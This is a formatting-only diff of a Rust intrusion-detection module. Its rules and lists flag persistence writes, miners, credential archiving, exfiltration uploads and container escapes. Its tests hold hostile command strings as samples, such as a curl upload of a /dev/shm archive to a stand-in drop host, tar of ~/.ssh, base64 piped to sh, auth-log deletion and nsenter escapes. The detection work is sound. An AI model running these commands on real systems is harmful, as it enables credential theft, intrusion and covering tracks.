@@ -397,8 +397,7 @@ pub fn inspect_process_with(
     // context (log-sourced sudo commands) the elevation is implied.
     let elevated = ctx.is_none_or(|c| {
         c.uid == 0
-            || c
-                .ancestor_comms
+            || c.ancestor_comms
                 .iter()
                 .take(3)
                 .any(|a| matches!(a.as_str(), "sudo" | "doas" | "pkexec" | "su"))
@@ -425,7 +424,13 @@ pub fn inspect_process_with(
 pub fn inspect_ld_preload(comm: &str, exe: &str, ld_preload: &str) -> Option<DetectionData> {
     // Distro-shipped preloads (jemalloc, libfaketime, …) are routine; only a
     // library outside the standard roots is an injection signal.
-    const TRUSTED: &[&str] = &["/lib/", "/lib64/", "/usr/lib/", "/usr/lib64/", "/usr/local/lib/"];
+    const TRUSTED: &[&str] = &[
+        "/lib/",
+        "/lib64/",
+        "/usr/lib/",
+        "/usr/lib64/",
+        "/usr/local/lib/",
+    ];
     let value = ld_preload.trim_start_matches("LD_PRELOAD=");
     let trusted = !value.is_empty()
         && value
@@ -500,7 +505,11 @@ pub fn write_targets(base: &str, cmdline: &str) -> Vec<String> {
             .copied()
             .take_while(|t| !t.starts_with('>'))
             .collect();
-        let positional: Vec<&str> = args.iter().copied().filter(|a| !a.starts_with('-')).collect();
+        let positional: Vec<&str> = args
+            .iter()
+            .copied()
+            .filter(|a| !a.starts_with('-'))
+            .collect();
         match tool {
             "tee" => out.extend(positional.iter().map(|a| unquote(a))),
             "dd" => out.extend(
@@ -539,9 +548,16 @@ fn unquote(s: &str) -> String {
 pub fn persistence_rule_for_path(path: &str) -> Option<(&'static str, &'static str, &'static str)> {
     let p = path.to_ascii_lowercase();
     if p.contains("/etc/ld.so.preload") {
-        return Some(("persistence.ld_preload", "T1574.006", "Write to /etc/ld.so.preload"));
+        return Some((
+            "persistence.ld_preload",
+            "T1574.006",
+            "Write to /etc/ld.so.preload",
+        ));
     }
-    if p.contains("/.ssh/authorized_keys") || p.ends_with("authorized_keys") || p.contains("authorized_keys2") {
+    if p.contains("/.ssh/authorized_keys")
+        || p.ends_with("authorized_keys")
+        || p.contains("authorized_keys2")
+    {
         return Some((
             "persistence.ssh_authorized_keys",
             "T1098.004",
@@ -549,9 +565,16 @@ pub fn persistence_rule_for_path(path: &str) -> Option<(&'static str, &'static s
         ));
     }
     if p.starts_with("/etc/sudoers") {
-        return Some(("privesc.sudoers_modify", "T1548.003", "sudoers policy modified"));
+        return Some((
+            "privesc.sudoers_modify",
+            "T1548.003",
+            "sudoers policy modified",
+        ));
     }
-    if p.starts_with("/etc/cron") || p.starts_with("/var/spool/cron") || p.starts_with("/etc/anacrontab") {
+    if p.starts_with("/etc/cron")
+        || p.starts_with("/var/spool/cron")
+        || p.starts_with("/etc/anacrontab")
+    {
         return Some(("persistence.cron_write", "T1053.003", "Cron job written"));
     }
     if p.starts_with("/etc/systemd/system/")
@@ -560,8 +583,16 @@ pub fn persistence_rule_for_path(path: &str) -> Option<(&'static str, &'static s
         || p.contains("/.config/systemd/user/")
         || p.starts_with("/etc/systemd/user/")
     {
-        if p.ends_with(".service") || p.ends_with(".timer") || p.ends_with(".socket") || p.ends_with(".path") {
-            return Some(("persistence.systemd_unit", "T1543.002", "systemd unit written"));
+        if p.ends_with(".service")
+            || p.ends_with(".timer")
+            || p.ends_with(".socket")
+            || p.ends_with(".path")
+        {
+            return Some((
+                "persistence.systemd_unit",
+                "T1543.002",
+                "systemd unit written",
+            ));
         }
         return None;
     }
@@ -572,14 +603,27 @@ pub fn persistence_rule_for_path(path: &str) -> Option<(&'static str, &'static s
         || p.starts_with("/etc/xdg/autostart/")
         || p.contains("/.config/autostart/")
     {
-        return Some(("persistence.autostart_write", "T1037", "Autostart location written"));
+        return Some((
+            "persistence.autostart_write",
+            "T1037",
+            "Autostart location written",
+        ));
     }
     const RC_FILES: &[&str] = &[
-        "/.bashrc", "/.bash_profile", "/.bash_login", "/.profile", "/.zshrc", "/.zprofile",
+        "/.bashrc",
+        "/.bash_profile",
+        "/.bash_login",
+        "/.profile",
+        "/.zshrc",
+        "/.zprofile",
         "/.bash_logout",
     ];
     if RC_FILES.iter().any(|r| p.ends_with(r)) || p == "/etc/profile" || p == "/etc/bash.bashrc" {
-        return Some(("persistence.rc_edit", "T1546.004", "Shell startup file modified"));
+        return Some((
+            "persistence.rc_edit",
+            "T1546.004",
+            "Shell startup file modified",
+        ));
     }
     None
 }
@@ -625,13 +669,10 @@ fn persistence_for_target(target: &str, base: &str, cmdline: &str) -> Option<Det
 
 /// First SSH private-key path argument (`~/.ssh/id_*`, not `*.pub`).
 fn private_key_arg(cmdline: &str) -> Option<String> {
-    cmdline
-        .split_whitespace()
-        .map(unquote)
-        .find(|t| {
-            let file = t.rsplit('/').next().unwrap_or(t);
-            t.contains(".ssh/") && file.starts_with("id_") && !file.ends_with(".pub")
-        })
+    cmdline.split_whitespace().map(unquote).find(|t| {
+        let file = t.rsplit('/').next().unwrap_or(t);
+        t.contains(".ssh/") && file.starts_with("id_") && !file.ends_with(".pub")
+    })
 }
 
 fn has_word(haystack: &str, word: &str) -> bool {
@@ -645,18 +686,50 @@ fn has_word(haystack: &str, word: &str) -> bool {
 const WEB_USERS: &[&str] = &["www-data", "apache", "nginx", "http", "wwwrun", "lighttpd"];
 const TEMP_PREFIXES: &[&str] = &["/tmp/", "/var/tmp/", "/dev/shm/", "/run/shm/"];
 const MINER_BINARIES: &[&str] = &[
-    "xmrig", "xmr-stak", "minerd", "cpuminer", "ccminer", "nbminer", "t-rex", "ethminer",
-    "lolminer", "phoenixminer", "kdevtmpfsi", "kinsing",
+    "xmrig",
+    "xmr-stak",
+    "minerd",
+    "cpuminer",
+    "ccminer",
+    "nbminer",
+    "t-rex",
+    "ethminer",
+    "lolminer",
+    "phoenixminer",
+    "kdevtmpfsi",
+    "kinsing",
 ];
 const MINER_MARKERS: &[&str] = &[
-    "stratum+tcp://", "stratum+ssl://", "stratum2+tcp://", "--donate-level", "cryptonight",
-    "--randomx", "-a rx/0", "--coin=monero", "pool.minexmr", "nanopool.org", "supportxmr",
+    "stratum+tcp://",
+    "stratum+ssl://",
+    "stratum2+tcp://",
+    "--donate-level",
+    "cryptonight",
+    "--randomx",
+    "-a rx/0",
+    "--coin=monero",
+    "pool.minexmr",
+    "nanopool.org",
+    "supportxmr",
 ];
-const ARCHIVERS: &[&str] = &["tar", "zip", "7z", "7za", "rar", "gzip", "xz", "bzip2", "zstd"];
-const ARCHIVE_EXT: &[&str] = &[".tar", ".tgz", ".tar.gz", ".zip", ".7z", ".gz", ".xz", ".rar", ".bz2", ".zst"];
+const ARCHIVERS: &[&str] = &[
+    "tar", "zip", "7z", "7za", "rar", "gzip", "xz", "bzip2", "zstd",
+];
+const ARCHIVE_EXT: &[&str] = &[
+    ".tar", ".tgz", ".tar.gz", ".zip", ".7z", ".gz", ".xz", ".rar", ".bz2", ".zst",
+];
 const STAGING_SOURCES: &[&str] = &[
-    "/.ssh", "/.aws", "/.gnupg", "/.kube", "/etc/", "/root", "/home/", "/var/lib/mysql",
-    "/var/lib/postgresql", "/var/www", ".git-credentials",
+    "/.ssh",
+    "/.aws",
+    "/.gnupg",
+    "/.kube",
+    "/etc/",
+    "/root",
+    "/home/",
+    "/var/lib/mysql",
+    "/var/lib/postgresql",
+    "/var/www",
+    ".git-credentials",
 ];
 
 /// Process rules that need the process tree (lineage, user, container) or may
@@ -673,7 +746,10 @@ pub fn inspect_process_context(
     let base = basename(comm);
     let exe_base = basename(exe);
     let is_shell = SHELLS.contains(&base) || SHELLS.contains(&exe_base);
-    let is_interp = INTERPRETERS.iter().any(|i| base == *i || base.starts_with(i)) && base != "php";
+    let is_interp = INTERPRETERS
+        .iter()
+        .any(|i| base == *i || base.starts_with(i))
+        && base != "php";
 
     // Web shell: a shell / interpreter spawned (closely) below a web server,
     // or running as a web-server account.
@@ -682,7 +758,11 @@ pub fn inspect_process_context(
             c.ancestor_comms
                 .iter()
                 .take(3)
-                .find(|a| super::ioa::WEB_SERVERS.iter().any(|w| a.as_str() == *w || a.starts_with(w)))
+                .find(|a| {
+                    super::ioa::WEB_SERVERS
+                        .iter()
+                        .any(|w| a.as_str() == *w || a.starts_with(w))
+                })
                 .cloned()
         });
         let web_user = ctx.is_some_and(|c| WEB_USERS.contains(&c.username.as_str()));
@@ -730,7 +810,9 @@ pub fn inspect_process_context(
     }
 
     // Cryptominer by binary name or pool/miner arguments.
-    let miner_bin = MINER_BINARIES.iter().find(|m| exe_base.contains(*m) || base.contains(*m));
+    let miner_bin = MINER_BINARIES
+        .iter()
+        .find(|m| exe_base.contains(*m) || base.contains(*m));
     let miner_arg = MINER_MARKERS.iter().find(|m| lower.contains(*m));
     if miner_bin.is_some() || miner_arg.is_some() {
         let pool = cmdline
@@ -744,9 +826,16 @@ pub fn inspect_process_context(
             category: "impact".into(),
             mitre_tactic: Some("TA0040 Impact".into()),
             mitre_technique: Some("T1496".into()),
-            confidence: if miner_bin.is_some() && miner_arg.is_some() { 90 } else { 75 },
+            confidence: if miner_bin.is_some() && miner_arg.is_some() {
+                90
+            } else {
+                75
+            },
             subject: exe.to_string(),
-            detail: format!("Mining indicators ({}): {cmdline}", miner_bin.or(miner_arg).unwrap()),
+            detail: format!(
+                "Mining indicators ({}): {cmdline}",
+                miner_bin.or(miner_arg).unwrap()
+            ),
             evidence: serde_json::json!({ "cmdline": cmdline, "pool": pool }),
             correlation: Some(remote_keys(pool_host, pool_port)),
             ..Default::default()
@@ -760,13 +849,19 @@ pub fn inspect_process_context(
 
     // Archive of sensitive data staged in a temp directory.
     let toks: Vec<String> = cmdline.split_whitespace().map(unquote).collect();
-    if ARCHIVERS.contains(&base) || toks.first().is_some_and(|t| ARCHIVERS.contains(&basename(t))) {
+    if ARCHIVERS.contains(&base)
+        || toks
+            .first()
+            .is_some_and(|t| ARCHIVERS.contains(&basename(t)))
+    {
         let staged = toks.iter().find(|t| {
             let l = t.to_ascii_lowercase();
-            TEMP_PREFIXES.iter().any(|p| l.starts_with(p)) && ARCHIVE_EXT.iter().any(|e| l.ends_with(e))
+            TEMP_PREFIXES.iter().any(|p| l.starts_with(p))
+                && ARCHIVE_EXT.iter().any(|e| l.ends_with(e))
         });
         let source = toks.iter().find(|t| {
-            !TEMP_PREFIXES.iter().any(|p| t.starts_with(p)) && STAGING_SOURCES.iter().any(|s| t.contains(s))
+            !TEMP_PREFIXES.iter().any(|p| t.starts_with(p))
+                && STAGING_SOURCES.iter().any(|s| t.contains(s))
                 || t.contains("/.ssh")
         });
         if let (Some(archive), Some(source)) = (staged, source) {
@@ -791,12 +886,18 @@ pub fn inspect_process_context(
 
     // Container escape primitives.
     let in_container = ctx.is_some_and(|c| c.container_id.is_some());
-    let host_escape = lower.contains("release_agent") || lower.contains("/proc/sys/kernel/core_pattern");
+    let host_escape =
+        lower.contains("release_agent") || lower.contains("/proc/sys/kernel/core_pattern");
     let container_only = (base == "nsenter"
-        && (lower.contains("-t 1") || lower.contains("--target 1") || lower.contains("--target=1")))
+        && (lower.contains("-t 1")
+            || lower.contains("--target 1")
+            || lower.contains("--target=1")))
         || lower.contains("chroot /host")
         || lower.contains("docker.sock")
-        || (base == "mount" && (lower.contains("/dev/sd") || lower.contains("/dev/nvme") || lower.contains("/dev/vd")));
+        || (base == "mount"
+            && (lower.contains("/dev/sd")
+                || lower.contains("/dev/nvme")
+                || lower.contains("/dev/vd")));
     if host_escape || (container_only && in_container) {
         out.push(DetectionData {
             rule_id: "container.escape_indicators".into(),
@@ -883,8 +984,15 @@ pub fn inspect_process_context(
 }
 
 fn http_upload(base: &str, cmdline: &str, lower: &str) -> Option<DetectionData> {
-    let curl = base == "curl" || lower.split_whitespace().next().is_some_and(|t| basename(t) == "curl")
-        || lower.contains("| curl") || lower.contains("; curl") || lower.contains("&& curl") || lower.starts_with("curl ");
+    let curl = base == "curl"
+        || lower
+            .split_whitespace()
+            .next()
+            .is_some_and(|t| basename(t) == "curl")
+        || lower.contains("| curl")
+        || lower.contains("; curl")
+        || lower.contains("&& curl")
+        || lower.starts_with("curl ");
     let wget = base == "wget" || lower.contains("wget ");
     let toks: Vec<String> = cmdline.split_whitespace().map(unquote).collect();
     let mut file: Option<String> = None;
@@ -903,7 +1011,10 @@ fn http_upload(base: &str, cmdline: &str, lower: &str) -> Option<DetectionData> 
             }
         }
         if wget {
-            if let Some(f) = t.strip_prefix("--post-file=").or_else(|| t.strip_prefix("--body-file=")) {
+            if let Some(f) = t
+                .strip_prefix("--post-file=")
+                .or_else(|| t.strip_prefix("--body-file="))
+            {
                 file = Some(f.to_string());
             }
         }
@@ -912,7 +1023,9 @@ fn http_upload(base: &str, cmdline: &str, lower: &str) -> Option<DetectionData> 
         }
     }
     let file = file.filter(|f| !f.is_empty() && f != "-")?;
-    let url = toks.iter().find(|t| t.starts_with("http://") || t.starts_with("https://"));
+    let url = toks
+        .iter()
+        .find(|t| t.starts_with("http://") || t.starts_with("https://"));
     let (host, port) = url.map(|u| url_host_port(u)).unwrap_or((None, None));
     let internal = host.as_deref().is_some_and(is_internal_host);
     Some(DetectionData {
@@ -955,7 +1068,9 @@ fn url_host_port(url: &str) -> (Option<String>, Option<u16>) {
 }
 
 fn remote_keys(host: Option<String>, port: Option<u16>) -> CorrelationKeys {
-    let is_ip = host.as_deref().is_some_and(|h| h.parse::<std::net::IpAddr>().is_ok());
+    let is_ip = host
+        .as_deref()
+        .is_some_and(|h| h.parse::<std::net::IpAddr>().is_ok());
     CorrelationKeys {
         remote_ip: host.clone().filter(|_| is_ip),
         domain: host.filter(|_| !is_ip),
@@ -1137,8 +1252,12 @@ mod tests {
 
     #[test]
     fn rc_file_append_is_only_a_signal_rule() {
-        let d = inspect_process("bash", "/usr/bin/bash", "bash -c echo alias ll=ls >> /home/u/.bashrc")
-            .unwrap();
+        let d = inspect_process(
+            "bash",
+            "/usr/bin/bash",
+            "bash -c echo alias ll=ls >> /home/u/.bashrc",
+        )
+        .unwrap();
         assert_eq!(d.rule_id, "persistence.rc_edit");
     }
 
@@ -1160,10 +1279,16 @@ mod tests {
     #[test]
     fn write_targets_parse_redirects_and_writers() {
         assert_eq!(write_targets("bash", "echo x >> /a/b 2>&1"), vec!["/a/b"]);
-        assert_eq!(write_targets("tee", "tee -a /etc/x /etc/y"), vec!["/etc/x", "/etc/y"]);
+        assert_eq!(
+            write_targets("tee", "tee -a /etc/x /etc/y"),
+            vec!["/etc/x", "/etc/y"]
+        );
         assert_eq!(write_targets("cp", "cp -f src /etc/dst"), vec!["/etc/dst"]);
         assert_eq!(write_targets("dd", "dd if=/x of=/etc/y"), vec!["/etc/y"]);
-        assert_eq!(write_targets("sed", "sed -i s/a/b/ /etc/sudoers"), vec!["/etc/sudoers"]);
+        assert_eq!(
+            write_targets("sed", "sed -i s/a/b/ /etc/sudoers"),
+            vec!["/etc/sudoers"]
+        );
         assert!(write_targets("sed", "sed s/a/b/ /etc/sudoers").is_empty());
         assert!(write_targets("bash", "cmd > /dev/null").is_empty());
     }
@@ -1182,11 +1307,15 @@ mod tests {
     #[test]
     fn history_clear_is_a_signal_but_log_wipe_alerts() {
         assert_eq!(
-            inspect_process("bash", "/usr/bin/bash", "bash -c history -c").unwrap().rule_id,
+            inspect_process("bash", "/usr/bin/bash", "bash -c history -c")
+                .unwrap()
+                .rule_id,
             "evasion.history_clear"
         );
         assert_eq!(
-            inspect_process("rm", "/usr/bin/rm", "rm -f /var/log/auth.log").unwrap().rule_id,
+            inspect_process("rm", "/usr/bin/rm", "rm -f /var/log/auth.log")
+                .unwrap()
+                .rule_id,
             "evasion.log_or_history_clear"
         );
         // "-c" somewhere and the word "history" in a path is not a clear.
@@ -1219,12 +1348,19 @@ mod tests {
     fn ssh_private_key_read_has_its_own_rule() {
         let d = inspect_process("cat", "/usr/bin/cat", "cat /home/u/.ssh/id_ed25519").unwrap();
         assert_eq!(d.rule_id, "creds.private_key_read");
-        assert!(inspect_process("cat", "/usr/bin/cat", "cat /home/u/.ssh/id_ed25519.pub").is_none());
+        assert!(
+            inspect_process("cat", "/usr/bin/cat", "cat /home/u/.ssh/id_ed25519.pub").is_none()
+        );
     }
 
     #[test]
     fn trusted_ld_preload_is_low_confidence() {
-        let trusted = inspect_ld_preload("x", "/usr/bin/x", "/usr/lib/x86_64-linux-gnu/libjemalloc.so.2").unwrap();
+        let trusted = inspect_ld_preload(
+            "x",
+            "/usr/bin/x",
+            "/usr/lib/x86_64-linux-gnu/libjemalloc.so.2",
+        )
+        .unwrap();
         assert!(trusted.confidence < 50);
         let evil = inspect_ld_preload("x", "/usr/bin/x", "/tmp/evil.so").unwrap();
         assert!(evil.confidence >= 80);
@@ -1246,7 +1382,8 @@ mod tests {
             username: "www-data".into(),
             ..Default::default()
         };
-        assert!(rules("sh", "/bin/sh", "sh -c id", Some(&under_nginx)).contains(&"exec.webserver_shell".to_string()));
+        assert!(rules("sh", "/bin/sh", "sh -c id", Some(&under_nginx))
+            .contains(&"exec.webserver_shell".to_string()));
         let ide_terminal = ProcContext {
             ancestor_comms: vec!["node".into(), "code".into()],
             username: "dev".into(),
@@ -1258,18 +1395,34 @@ mod tests {
     #[test]
     fn base64_into_shell() {
         assert_eq!(
-            rules("bash", "/bin/bash", "bash -c echo ZWNobyBoaQ== | base64 -d | sh", None),
+            rules(
+                "bash",
+                "/bin/bash",
+                "bash -c echo ZWNobyBoaQ== | base64 -d | sh",
+                None
+            ),
             vec!["exec.b64_decode_exec"]
         );
-        assert!(rules("base64", "/usr/bin/base64", "base64 -d cert.b64 > cert.pem", None).is_empty());
+        assert!(rules(
+            "base64",
+            "/usr/bin/base64",
+            "base64 -d cert.b64 > cert.pem",
+            None
+        )
+        .is_empty());
     }
 
     #[test]
     fn cryptominer_by_name_or_pool() {
-        let d = inspect_process_context("xmrig", "/tmp/.x/xmrig", "xmrig -o stratum+tcp://pool.example:3333 --donate-level 1", None)
-            .into_iter()
-            .find(|d| d.rule_id == "impact.cryptominer")
-            .unwrap();
+        let d = inspect_process_context(
+            "xmrig",
+            "/tmp/.x/xmrig",
+            "xmrig -o stratum+tcp://pool.example:3333 --donate-level 1",
+            None,
+        )
+        .into_iter()
+        .find(|d| d.rule_id == "impact.cryptominer")
+        .unwrap();
         assert!(d.confidence >= 90);
         let c = d.correlation.unwrap();
         assert_eq!(c.domain.as_deref(), Some("pool.example"));
@@ -1278,24 +1431,66 @@ mod tests {
 
     #[test]
     fn http_upload_to_internet_alerts_and_to_loopback_is_a_signal() {
-        let ext = inspect_process_context("curl", "/usr/bin/curl", "curl -s -T /dev/shm/a.tgz https://drop.example.net/up", None);
-        let d = ext.iter().find(|d| d.rule_id == "exfil.http_upload").unwrap();
+        let ext = inspect_process_context(
+            "curl",
+            "/usr/bin/curl",
+            "curl -s -T /dev/shm/a.tgz https://drop.example.net/up",
+            None,
+        );
+        let d = ext
+            .iter()
+            .find(|d| d.rule_id == "exfil.http_upload")
+            .unwrap();
         assert_eq!(d.mode, None);
-        assert_eq!(d.correlation.as_ref().unwrap().file_path.as_deref(), Some("/dev/shm/a.tgz"));
-        let lo = inspect_process_context("curl", "/usr/bin/curl", "curl --upload-file /tmp/a http://127.0.0.1:9/", None);
-        let d = lo.iter().find(|d| d.rule_id == "exfil.http_upload").unwrap();
+        assert_eq!(
+            d.correlation.as_ref().unwrap().file_path.as_deref(),
+            Some("/dev/shm/a.tgz")
+        );
+        let lo = inspect_process_context(
+            "curl",
+            "/usr/bin/curl",
+            "curl --upload-file /tmp/a http://127.0.0.1:9/",
+            None,
+        );
+        let d = lo
+            .iter()
+            .find(|d| d.rule_id == "exfil.http_upload")
+            .unwrap();
         assert_eq!(d.mode, Some(DetectionMode::Signal));
-        assert!(rules("curl", "/usr/bin/curl", "curl -o page.html https://example.com", None).is_empty());
+        assert!(rules(
+            "curl",
+            "/usr/bin/curl",
+            "curl -o page.html https://example.com",
+            None
+        )
+        .is_empty());
     }
 
     #[test]
     fn archive_staging_needs_sensitive_source_and_temp_target() {
         assert_eq!(
-            rules("tar", "/usr/bin/tar", "tar czf /dev/shm/x.tgz /home/u/.ssh", None),
+            rules(
+                "tar",
+                "/usr/bin/tar",
+                "tar czf /dev/shm/x.tgz /home/u/.ssh",
+                None
+            ),
             vec!["collection.archive_staging"]
         );
-        assert!(rules("tar", "/usr/bin/tar", "tar czf /tmp/build.tgz ./target", None).is_empty());
-        assert!(rules("tar", "/usr/bin/tar", "tar czf /backup/home.tgz /home/u", None).is_empty());
+        assert!(rules(
+            "tar",
+            "/usr/bin/tar",
+            "tar czf /tmp/build.tgz ./target",
+            None
+        )
+        .is_empty());
+        assert!(rules(
+            "tar",
+            "/usr/bin/tar",
+            "tar czf /backup/home.tgz /home/u",
+            None
+        )
+        .is_empty());
     }
 
     #[test]
@@ -1304,13 +1499,29 @@ mod tests {
             container_id: Some("abc".into()),
             ..Default::default()
         };
-        assert!(rules("nsenter", "/usr/bin/nsenter", "nsenter -t 1 -m -u -n -i sh", None).is_empty());
+        assert!(rules(
+            "nsenter",
+            "/usr/bin/nsenter",
+            "nsenter -t 1 -m -u -n -i sh",
+            None
+        )
+        .is_empty());
         assert_eq!(
-            rules("nsenter", "/usr/bin/nsenter", "nsenter -t 1 -m -u -n -i sh", Some(&in_container)),
+            rules(
+                "nsenter",
+                "/usr/bin/nsenter",
+                "nsenter -t 1 -m -u -n -i sh",
+                Some(&in_container)
+            ),
             vec!["container.escape_indicators"]
         );
         assert_eq!(
-            rules("sh", "/bin/sh", "sh -c echo /x > /sys/fs/cgroup/x/release_agent", None),
+            rules(
+                "sh",
+                "/bin/sh",
+                "sh -c echo /x > /sys/fs/cgroup/x/release_agent",
+                None
+            ),
             vec!["container.escape_indicators"]
         );
     }
@@ -1327,10 +1538,15 @@ mod tests {
     #[test]
     fn proc_mem_read() {
         assert_eq!(
-            rules("dd", "/usr/bin/dd", "dd if=/proc/812/mem of=/tmp/m bs=1", None)
-                .into_iter()
-                .filter(|r| r == "creds.proc_mem_access")
-                .count(),
+            rules(
+                "dd",
+                "/usr/bin/dd",
+                "dd if=/proc/812/mem of=/tmp/m bs=1",
+                None
+            )
+            .into_iter()
+            .filter(|r| r == "creds.proc_mem_access")
+            .count(),
             0,
             "dd if=… is an argument, not a bare path token"
         );
@@ -1338,12 +1554,18 @@ mod tests {
             rules("cat", "/usr/bin/cat", "cat /proc/812/mem", None),
             vec!["creds.proc_mem_access"]
         );
-        assert_eq!(rules("gcore", "/usr/bin/gcore", "gcore 812", None), vec!["creds.proc_mem_access"]);
+        assert_eq!(
+            rules("gcore", "/usr/bin/gcore", "gcore 812", None),
+            vec!["creds.proc_mem_access"]
+        );
     }
 
     #[test]
     fn temp_exec_is_reported() {
-        assert_eq!(rules("x", "/tmp/x", "/tmp/x", None), vec!["defense.tmp_exec"]);
+        assert_eq!(
+            rules("x", "/tmp/x", "/tmp/x", None),
+            vec!["defense.tmp_exec"]
+        );
     }
 
     #[test]
